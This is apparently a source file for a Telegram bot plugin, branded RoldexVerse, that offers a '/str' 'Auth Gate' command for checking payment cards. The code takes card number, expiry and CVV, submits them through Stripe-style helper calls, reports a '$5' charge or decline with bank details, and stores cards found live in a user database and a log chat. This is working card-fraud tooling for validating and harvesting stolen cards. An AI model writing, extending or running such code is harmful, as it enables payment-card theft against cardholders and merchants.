"""
≛ <b>Commands Available</b> ≛

──────────────────────
- <code>/au</code> cc cvv mes ano || <reply_to_msg>
➛ Auth Gate
──────────────────────

©<a href="https://t.me/roldexverse">RoldexVerse</a>
"""


import os
import re
import time
import requests
from mills import LOG_CHAT

from mills.decorators import bot_cmd
from mills.plugins.checkers.utils.gateinfo import get_gate_info
from mills.plugins import rand_user_base
from mills.plugins.checkers.utils.getcards  import get_cards
from mills.plugins._helpers.strings import get_strings
from mills.plugins.checkers.funcs.str_defs import str_one, str_two, get_response_str




@bot_cmd(cmd="str", text_only = True)
@get_gate_info("str")
@get_cards()
@get_strings("card_chk")
async def _(m, gate_db, user_db, cards, lang):
    start_time = int(time.time())
    cc,mes,ano,cvv, bin_info = cards
    rand_user = rand_user_base.rand_user()
    message = await m.reply(lang['fir_msg'].format(
        gate_name = gate_db['gate_name'],
        name = m.full_name(),
        id = m.sender_id,
        taken = int(time.time()) - start_time,
    ))
    json_first = str_one(cc,mes,ano,cvv,rand_user)
    if 'error' in json_first:
        messa = json_first['error']['decline_code'].replace('_', ' ') if 'decline_code' in json_first['error'] else json_first['error']['code'].replace('_', ' ')
        await message.edit(lang['fin_msg'].format(
            gate_name = gate_db['gate_name'],
            card = f"{cc}|{mes}|{ano}|{cvv}",
            logo = "❌",
            status = json_first['error']['code'].replace('_', ' ').title(),
            message = messa,
            vendor = bin_info['vendor'],
            type = bin_info['type'],
            bank_name = bin_info['bank_name'],
            country = bin_info['iso'],
            flag = bin_info['flag'],
            name = m.full_name(),
            id = m.sender_id,
            role = user_db['role'],
            taken = int(time.time()) - start_time,
        ))
        return
    await message.edit(lang['mid_msg'].format(
        gate_name = gate_db['gate_name'],
        name = m.full_name(),
        id = m.sender_id,
        taken = int(time.time()) - start_time,
    ))
    last = str_two(json_first['id'], rand_user)
    if not 'error' in last:
        m.log.info(last)
        r_text, r_logo, r_respo = "Charged $5", "✅", 'CVV LIVE'
    else:
        stripeMessage = last['error'] if 'error' in last else "Unknown Error"
        r_text, r_logo , r_respo = get_response_str(stripeMessage)
    await message.edit(lang['fin_msg'].format(
        gate_name = gate_db['gate_name'],
        card = f"{cc}|{mes}|{ano}|{cvv}",
        status = r_respo or r_respo,
        logo = r_logo,
        message = r_text,
        vendor = bin_info['vendor'],
        type = bin_info['type'],
        bank_name = bin_info['bank_name'],
        country = bin_info['iso'],
        flag = bin_info['flag'],
        name = m.full_name(),
        id = m.sender_id,
        role = user_db['role'],
        taken = int(time.time()) - start_time,
    ), link_preview = False)
    if  r_respo == "CVV MATCH":
        if user_db['saveccs']:
            await m.mdb.update_one('users',{'_id': m.sender_id}, {'$addToSet': {'lives': f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}"}})
        m.save_lives(f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
        await m.client.send_message(LOG_CHAT, f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    await m.adb.set_key(f'antispam_{str(m.sender_id)}', time.time())
    return